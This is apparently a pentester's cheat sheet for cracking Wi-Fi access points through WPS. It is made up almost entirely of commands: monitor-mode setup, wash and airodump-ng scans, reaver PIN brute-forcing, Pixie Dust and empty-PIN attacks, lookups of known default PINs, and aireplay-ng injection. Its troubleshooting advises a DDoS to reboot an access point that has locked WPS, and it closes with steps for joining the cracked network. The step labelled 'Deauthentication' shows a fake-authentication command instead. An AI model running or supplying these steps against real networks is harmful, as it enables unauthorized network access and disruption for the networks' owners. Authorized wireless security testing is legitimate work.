### Setup

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Identify the network

Scan for AP's with WPS enabled:
```bash
wash -i wlan0mon

# Also scan for 5 GHz
wash -i wlan0mon -5 

# Airodump approach
sudo airodump-ng --wps
sudo airodump-ng --wps --band abg
```


### Attack

Reaver:
```bash
sudo reaver -b <BSSID> -i wlan0mon -v
```
>[!info]
>Add `-c` parameter if the "Waiting for beacon" message appears

PixieWPS attack:
```bash
sudo reaver -b <BSSID> -i wlan0mon -v -K

# Empty pin
sudo reaver -b <BSSID> -i wlan0mon -v -p '' 
```

Known pin attacks:
```bash
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db

# Check using first 3 bytes of BSSID (must be uppercase)
echo ${PINDB["0013F7"]}
```

Deauthentication:
```bash
sudo aireplay-ng --fakeauth 30 -a <BSSID> -h <Own MAC> wlan0mon
```
>[!info]
>Sometimes only deauthenticating once is better: `-0 1`


### Troubleshooting

When using PixieWPS attack:
```bash
[!] WPS transaction failed (code: 0x03), re-trying last pin
```
>[!Fix]
>Restart reaver without PixieWPS option and restore previous session

ACK issues:
```bash
[+] Sending identity response
[+] Received identity request
```
>[!Fix]
>Use another card with a different chipset

WPS Lock:
>[!Fix]
>Perform DDoS to reboot AP


### Connect to the network

Start the NetworkManager service:
```bash
sudo service NetworkManager start
```

Set the interface up:
```bash
sudo ifconfig wlan1 up
```

Create the configuration file to connect to the network: `connect.config`
```bash
network={
  ssid="<ESSID>"
  scan_ssid=1
  psk="<PASSWORD>"
  key_mgmt=WPA-PSK
}
```

Use the configuration file to connect to the network:
```bash
sudo wpa_supplicant -i wlan1 -c connect.config
```

Obtain DHCP address:
```bash
sudo dhclient wlan1
```
